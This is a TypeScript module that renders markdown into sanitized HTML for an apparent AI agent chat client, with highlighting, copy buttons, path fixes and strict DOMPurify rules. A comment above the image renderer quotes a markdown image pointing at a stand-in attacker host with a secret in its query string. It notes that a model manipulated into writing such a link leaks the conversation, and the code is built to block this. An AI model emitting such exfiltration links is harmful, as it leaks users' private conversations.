/**
 * Markdown → sanitized HTML for chat bubbles.
 *
 * Why a thin wrapper: chat-client renders messages via `dangerouslySetInnerHTML`
 * (lots of mixed content — text, tool_use cards, permission cards built as
 * HTML strings), so a string-in / string-out markdown pipe drops in cleanly
 * without refactoring the bubble layer. The trade-off vs `react-markdown`
 * is fine here — bubbles are small, trusted-ish (provider output) but still
 * sanitized as a defence-in-depth measure.
 *
 * Highlighting: highlight.js auto-detection at parse time. We register
 * only the common languages we expect in agent transcripts to keep the
 * bundle reasonable, and load them apart from the core (`loadHighlighter`).
 */

import { marked, Marked, type Tokens, type Token } from 'marked';
import DOMPurify from 'isomorphic-dompurify';
import { t, getLocale } from './i18n';
import hljs from 'highlight.js/lib/core';

// The grammars weigh four times the core: they load on demand
// (`loadHighlighter`), started as soon as this module runs. A block rendered
// before they land is escaped plain text, the same as an unknown language.
let highlighterVersion = 0;
let languages: Promise<void> | null = null;
const highlighterListeners = new Set<() => void>();

/** Resolves once every grammar is registered; tests await it. */
export function loadHighlighter(): Promise<void> {
  languages ??= import('./highlight-languages').then((m) => {
    m.registerHighlightLanguages(hljs);
    highlighterVersion += 1;
    for (const listener of highlighterListeners) listener();
  });
  return languages;
}
void loadHighlighter();

/** Bumps when the grammars land: HTML built before that has uncoloured code
 *  blocks, so anything that caches it keys on this number. */
export function currentHighlighterVersion(): number {
  return highlighterVersion;
}

/** `useSyncExternalStore` shape: a cached rendering redraws when the grammars land. */
export function subscribeHighlighter(listener: () => void): () => void {
  highlighterListeners.add(listener);
  return () => { highlighterListeners.delete(listener); };
}

// Custom marked renderer: pipe code blocks through highlight.js and emit
// the lang as a data attribute so CSS can show a corner label. Text-content
// substitution only — DOMPurify cleans the whole tree afterwards.
const renderer = new marked.Renderer();
const originalTable = renderer.table;
renderer.table = function (token: Tokens.Table): string {
  return `<div class="markdown-table-scroll" tabindex="0" role="region" aria-label="${escapeAttr(t('chatMarkdown.tableScroll'))}">${originalTable.call(this, token)}</div>`;
};
const originalCode = renderer.code.bind(renderer);
renderer.code = function (token: Tokens.Code): string {
  const code = token.text;
  const lang = (token.lang || '').trim().split(/\s+/)[0] || '';
  let out: string;
  let resolvedLang = lang;
  if (lang && hljs.getLanguage(lang)) {
    try {
      out = hljs.highlight(code, { language: lang, ignoreIllegals: true }).value;
    } catch {
      out = escapeHtml(code);
    }
  } else if (!lang) {
    // Auto-detect when no language is specified.
    try {
      const auto = hljs.highlightAuto(code);
      out = auto.value;
      resolvedLang = auto.language ?? '';
    } catch {
      out = escapeHtml(code);
    }
  } else {
    out = escapeHtml(code);
  }
  const langAttr = resolvedLang ? ` data-lang="${escapeAttr(resolvedLang)}"` : '';
  // The <pre> is wrapped in a positioned container: the copy button is
  // anchored to the container, not to the <pre>, otherwise it would scroll
  // with the code on a horizontally scrollable block.
  return `<div class="code-wrap">${copyButtonHtml()}<pre${langAttr}><code class="hljs language-${escapeAttr(resolvedLang || 'plain')}">${out}</code></pre></div>`;
  void originalCode;
};

/**
 * "Copy" button injected into raw HTML (rendered markdown, tool_use quotes).
 * No React `onClick` can be set on it: the nodes are born from a
 * `dangerouslySetInnerHTML` and are not managed by React. The click is
 * therefore handled by delegation in chat-client.tsx, which tests
 * `closest('.copy-btn')`.
 *
 * `payload` is only set when the text to copy cannot be read in the DOM
 * (tool_use quote truncated to 200 chars) — on a code block the `textContent`
 * of the neighbouring `<code>` is read rather than duplicating the content in
 * an attribute.
 *
 * Both icons coexist in the DOM; the `copied` class set on click switches the
 * display from one to the other (see the .chat-bubble CSS).
 */
export function copyButtonHtml(extraClass = '', payload?: string, label = t('chatPage.copy')): string {
  const cls = ('copy-btn ' + extraClass).trim();
  const data = payload ? ` data-copy="${escapeAttr(payload)}"` : '';
  return (
    `<button type="button" class="${escapeAttr(cls)}" aria-label="${escapeAttr(label)}" title="${escapeAttr(label)}" data-copy-label="${escapeAttr(label)}"${data}>` +
    '<svg class="i-copy" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' +
    '<rect x="9" y="9" width="13" height="13" rx="2"></rect>' +
    '<path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>' +
    '</svg>' +
    '<svg class="i-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' +
    '<path d="M20 6 9 17l-5-5"></path>' +
    '</svg>' +
    '</button>'
  );
}

/**
 * Markdown never shows a picture (SUG-0008). `![x](https://attacker/p.png?secret=…)`
 * is how a model talked into it leaks a conversation: the reader's browser
 * fetches the address, no click needed. An agent shows media through the
 * typed `chat_show_media` request instead; here an image is only its caption,
 * marked as not shown.
 */
function imageNote(alt: string): string {
  const label = alt.trim() ? t('chatMedia.markdownImageAlt', { alt: alt.trim() }) : t('chatMedia.markdownImage');
  return `<span class="md-image-note" role="note">${escapeHtml(label)}</span>`;
}
function imageSlot(token: Tokens.Image): string {
  return imageNote(token.text);
}
renderer.image = imageSlot;

/**
 * CommonMark reads a backslash before ASCII punctuation as an escape, so an
 * agent writing `C:\Users\toto\.copilot` showed `C:\Users\toto.copilot`
 * (TIM-0141). This inline rule runs before marked's own `escape` and keeps the
 * backslash only where it reads as a Windows path separator:
 * - the next character can sit in a file name (`*`, `` ` ``, `|`, `<`, `>`,
 *   `"`, `?`, `:` and `/` cannot, so `\*not italic\*` is always an escape);
 * - the backslash follows a path character, not a space or a line start;
 * - the text before it on the same run holds a path anchor: a drive (`C:\`),
 *   a UNC root (`\\host`) or a backslash before a letter or digit, which
 *   markdown never treats as an escape and so only a path writes.
 * The leading `\\` of a UNC path (`\\server\share`) is kept the same way.
 * Code spans and fenced blocks never reach inline rules: they are untouched.
 */
const PATH_ESCAPABLE = /^\\[!#$%&'()+,\-.;=@[\]^_{}~]/;
const UNC_ROOT = /^\\\\[^\\\s<>"|?*`/]+\\/;
/** Characters a path cannot hold: the run that may be a path starts after the last one. */
const NOT_IN_PATH = /[\n<>"|?*`]/;
const DRIVE_ANCHOR = /(?:^|[^A-Za-z0-9])[A-Za-z]:\\/;
const SEPARATOR_ANCHOR = /\\[A-Za-z0-9]/;

/** The source written before the current position, back to the line start. */
function precedingLine(tokens: Token[]): string {
  let text = '';
  for (let i = tokens.length - 1; i >= 0; i -= 1) {
    const raw = tokens[i]!.raw;
    const newline = raw.lastIndexOf('\n');
    if (newline >= 0) return raw.slice(newline + 1) + text;
    text = raw + text;
  }
  return text;
}

function pathRun(before: string): string {
  for (let i = before.length - 1; i >= 0; i -= 1) {
    if (NOT_IN_PATH.test(before[i]!)) return before.slice(i + 1);
  }
  return before;
}

function pathBackslash(src: string, tokens: Token[]): Tokens.Generic | undefined {
  if (src[0] !== '\\') return undefined;
  const before = precedingLine(tokens);
  const unc = UNC_ROOT.exec(src);
  if (unc) {
    // A root only where a path can start: line start, space, quote or bracket.
    if (before && !/[\s"'([{<]$/.test(before)) return undefined;
    return { type: 'pathBackslash', raw: '\\\\' };
  }
  const escape = PATH_ESCAPABLE.exec(src);
  if (!escape) return undefined;
  const run = pathRun(before);
  if (!run || /\s$/.test(run)) return undefined;
  if (!DRIVE_ANCHOR.test(`${run}\\`) && !SEPARATOR_ANCHOR.test(run)) return undefined;
  return { type: 'pathBackslash', raw: escape[0] };
}

const windowsPathExtension = {
  extensions: [{
    name: 'pathBackslash',
    level: 'inline' as const,
    start: (src: string) => src.indexOf('\\'),
    tokenizer: (src: string, tokens: Token[]) => pathBackslash(src, tokens),
    renderer: (token: Tokens.Generic) => escapeHtml(token.raw),
  }],
};

marked.use({ renderer, gfm: true, breaks: true }, windowsPathExtension);

function hasClosedFence(raw: string): boolean {
  const opening = /^ {0,3}(`{3,}|~{3,})[^\n]*\n/.exec(raw);
  if (!opening) return false;
  const fence = opening[1]!;
  return new RegExp(`(?:^|\\n) {0,3}${fence[0]}{${fence.length},}[ \\t]*(?:\\n)?$`).test(raw.slice(opening[0].length));
}

const streamingRenderer = {
  table: renderer.table,
  image: imageSlot,
  code(this: typeof renderer, token: Tokens.Code): string {
    // Highlight only closed fences; guessing a language on every token is costly.
    if (hasClosedFence(token.raw)) return renderer.code.call(this, token);
    return `<div class="code-wrap">${copyButtonHtml()}<pre><code>${escapeHtml(token.text)}</code></pre></div>`;
  },
};
const streamParser = new Marked<string, string>({ renderer: streamingRenderer, gfm: true, breaks: true }, windowsPathExtension);
const streamTableParser = new Marked<string, string>({ renderer: { ...streamingRenderer, table: originalTable }, gfm: true, breaks: true }, windowsPathExtension);

export type StreamingMarkdownBlock = { key: string; html: string; table: boolean };

/** Cache only the latest blocks, not every past version of a growing paragraph. */
export function createStreamingMarkdownRenderer() {
  let previous: Array<{ signature: string; block: StreamingMarkdownBlock }> = [];
  return (text: string): StreamingMarkdownBlock[] => {
    const tokens = streamParser.lexer(text);
    // Late reference definitions can change a previously complete paragraph.
    const references = JSON.stringify(tokens.links);
    const locale = getLocale();
    const visibleTokens = tokens.filter((token: Token) => token.type !== 'space' && token.type !== 'def');
    const next = visibleTokens.map((token, index) => {
      const signature = `${locale}:${highlighterVersion}:${references}:${token.type}:${token.raw}`;
      const cached = previous[index];
      if (cached?.signature === signature) return cached;
      const table = token.type === 'table';
      const raw = (table ? streamTableParser : streamParser).parser([token]);
      return { signature, block: {
        key: `${index}:${token.type}`,
        html: sanitizeMarkdownHtml(raw, true),
        table,
      } };
    });
    previous = next;
    return next.map((entry) => entry.block);
  };
}

export function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function escapeAttr(s: string): string {
  return escapeHtml(s);
}

/**
 * Render a markdown string into sanitized HTML suitable for
 * dangerouslySetInnerHTML. Empty input returns the empty string.
 */
export function mdToSafeHtml(md: string, options: { copyLinks?: boolean } = {}): string {
  if (!md) return '';
  const raw = marked.parse(md, { async: false }) as string;
  return sanitizeMarkdownHtml(raw, options.copyLinks);
}

/**
 * Sanitizer settings for rendered markdown. Beyond scripts, the concern is
 * anything that makes the browser fetch on its own: rendered markdown loads
 * nothing (SUG-0008). Hence no `<video>`/`<audio>`/`<picture>`, no SVG
 * `<image>`/`<use>`, no `srcset`/`poster`/`background`, and no CSS at all — a
 * `style` attribute or tag reaches the network through `url()` and could
 * restyle the whole app. `<img>` survives this pass only to be replaced.
 */
const SANITIZE_CONFIG = {
  // Keep the highlight.js class names on <span>/<code>/<pre> so the
  // theme CSS can colour tokens; allow data-lang for the corner label
  // and data-copy for the copy button's payload.
  ADD_ATTR: ['data-lang', 'data-copy'],
  FORBID_TAGS: ['style', 'link', 'video', 'audio', 'source', 'track', 'picture', 'image', 'use', 'feImage', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['style', 'srcset', 'poster', 'background', 'ping', 'xlink:href'],
  RETURN_DOM_FRAGMENT: true as const,
};

/** What the tag and attribute lists cannot express: `<input type="image"
 *  src>` fetches, and so does an SVG presentation attribute such as
 *  `fill="url(https://…)"`. `<img>` is left alone, it is about to be replaced. */
function stripFetchingAttributes(fragment: DocumentFragment): void {
  for (const el of Array.from(fragment.querySelectorAll('*'))) {
    if (el.tagName.toLowerCase() === 'img') continue;
    for (const attr of Array.from(el.attributes)) {
      if (attr.name === 'src' || /url\s*\(/i.test(attr.value)) el.removeAttribute(attr.name);
    }
  }
}

/** A raw `<img>` in a message is treated like a markdown image: its caption,
 *  marked as not shown. */
function replaceImages(fragment: DocumentFragment): void {
  const doc = fragment.ownerDocument;
  for (const img of Array.from(fragment.querySelectorAll('img'))) {
    const holder = doc.createElement('span');
    holder.innerHTML = imageNote(img.getAttribute('alt') ?? '');
    img.replaceWith(...Array.from(holder.childNodes));
  }
}

/** A Windows drive path (`D:/…`, `C:\\…`; marked writes the backslash `%5C`) or an empty-host `file:` URL. */
const WINDOWS_PATH_HREF = /^[a-z]:(?:[\\/]|%5c|%2f)/i;
const FILE_URL_HREF = /^file:\/\/\//i;

/**
 * DOMPurify reads `D:/…` as an unknown scheme `d:` and drops the whole href —
 * `file:///…` and `C:\…` too — so the chat's click handler never saw a link to
 * a file on a Windows machine (TIM-0106). Those forms are rewritten to the
 * root-relative spelling it keeps and `resolveFileLink` already reads
 * (`/D:/…`, TIM-0076). Nothing is allowed through: the sanitizer still decides
 * about the rewritten value, and any other scheme stays refused.
 */
function localFileHref(value: string): string | null {
  const href = value.trim();
  // `file:////host/x` would become `//host/x`, a link to another origin.
  if (FILE_URL_HREF.test(href)) return href.startsWith('////', 'file:'.length) ? null : href.slice('file://'.length);
  if (WINDOWS_PATH_HREF.test(href)) return `/${href.replace(/\\|%5c/gi, '/')}`;
  return null;
}

function rewriteLocalFileHref(node: Element, data: { attrName: string; attrValue: string }): void {
  if (data.attrName !== 'href' || node.tagName.toLowerCase() !== 'a') return;
  const rewritten = localFileHref(data.attrValue);
  if (rewritten !== null) data.attrValue = rewritten;
}

/** Decorate sanitized links so entities are decoded exactly once for copying. */
export function sanitizeMarkdownHtml(raw: string, copyLinks = false): string {
  // Installed for this call only: the instance is shared with the other sanitizers.
  DOMPurify.addHook('uponSanitizeAttribute', rewriteLocalFileHref);
  let fragment: DocumentFragment;
  try {
    fragment = DOMPurify.sanitize(raw, SANITIZE_CONFIG);
  } finally {
    DOMPurify.removeHook('uponSanitizeAttribute', rewriteLocalFileHref);
  }
  stripFetchingAttributes(fragment);
  replaceImages(fragment);
  if (copyLinks) decorateLinks(fragment);
  const holder = fragment.ownerDocument.createElement('div');
  holder.append(fragment);
  return holder.innerHTML;
}

function decorateLinks(fragment: DocumentFragment): void {
  for (const link of Array.from(fragment.querySelectorAll('a[href]'))) {
    const href = link.getAttribute('href') ?? '';
    if (!/^https?:\/\//i.test(href) || link.closest('pre, code')) continue;
    const holder = fragment.ownerDocument.createElement('span');
    holder.innerHTML = copyButtonHtml('url-copy', href, t('chatMarkdown.copyUrl'));
    link.after(...Array.from(holder.childNodes));
  }
}

/**
 * Highlight a raw code snippet with the same hljs instance + theme used
 * by the markdown pipe. Returns sanitised HTML ready for
 * dangerouslySetInnerHTML inside a `<pre><code class="hljs">` host.
 *
 * `lang` is a hljs language id (see hljsLanguageFor in file-icons.tsx);
 * pass null to auto-detect. Unknown / unregistered languages fall back
 * to plain escaping so the file content stays readable.
 */
export function highlightCode(code: string, lang: string | null): string {
  if (!code) return '';
  let out: string;
  if (lang && hljs.getLanguage(lang)) {
    try {
      out = hljs.highlight(code, { language: lang, ignoreIllegals: true }).value;
    } catch {
      out = escapeHtml(code);
    }
  } else if (!lang) {
    try {
      out = hljs.highlightAuto(code).value;
    } catch {
      out = escapeHtml(code);
    }
  } else {
    out = escapeHtml(code);
  }
  return DOMPurify.sanitize(out);
}

/**
 * Splits highlighted HTML into self-contained lines, each one closing then
 * reopening the `<span>` still open. Without it, a multi-line string (Python
 * docstring, block comment) leaves a span straddling several `<li>` and the
 * browser paints the whole rest of the file in the same colour.
 *
 * The input comes from `highlightCode`: only `<span class="…">`, `</span>`
 * and escaped text flow through it — no arbitrary attributes nor
 * self-closing tags to handle.
 */
export function splitHighlightedLines(html: string): string[] {
  const lines: string[] = [];
  const open: string[] = [];
  let current = '';
  const tag = /<\/?span[^>]*>/g;
  let last = 0;

  const pushText = (text: string) => {
    const parts = text.split('\n');
    parts.forEach((part, i) => {
      if (i > 0) {
        lines.push(current + '</span>'.repeat(open.length));
        current = open.join('');
      }
      current += part;
    });
  };

  let m: RegExpExecArray | null;
  while ((m = tag.exec(html)) !== null) {
    pushText(html.slice(last, m.index));
    last = m.index + m[0].length;
    if (m[0].startsWith('</')) open.pop();
    else open.push(m[0]);
    current += m[0];
  }
  pushText(html.slice(last));
  lines.push(current);
  return lines;
}
